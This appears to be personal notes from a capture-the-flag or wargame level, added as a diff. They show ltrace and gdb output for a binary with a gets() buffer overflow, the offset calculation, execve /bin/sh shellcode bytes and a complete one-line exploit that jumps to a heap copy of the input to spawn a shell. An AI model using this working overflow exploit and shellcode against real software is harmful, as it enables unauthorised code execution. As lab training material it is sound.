@@ -1,0 +1,31 @@
+ ltrace ./level2 
+__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                                                                = 0
+gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5hey
+)                                                     = 0xbffff6fc
+puts("hey"hey
+)                                                                                       = 4
+strdup("hey")                                                                                     = 0x0804a008
+
+target addr -> 0x0804a008
+
+
+
+(gdb) run
+Starting program: /home/user/level2/level2
+AAAAbbbbCCCCddddEEEEffffGGGGhhhhIIIIjjjjjKKKKllllMMMMnnnnOOOOppppQQQQrrrrSSSSttttUUUUvvvv
+AAAAbbbbCCCCddddEEEEffffGGGGhhhhIIIIjjjjjKKKKllllMMMMnnnnOOOOppptUUUQrrrrSSSSttttUUUUvvvv
+
+Program received signal SIGSEGV, Segmentation fault.
+0x55555574 in ?? () -> 0xUUUt -> 80
+
+
+shellcode (21) + x = 80
+offset -> x = 59
+
+shellcode https://shell-storm.org/shellcode/files/shellcode-841.html
+\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd
+\x80
+
+(python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'x' * 59 + '\x08\xa0\x04\x08'"; cat) | ./level2
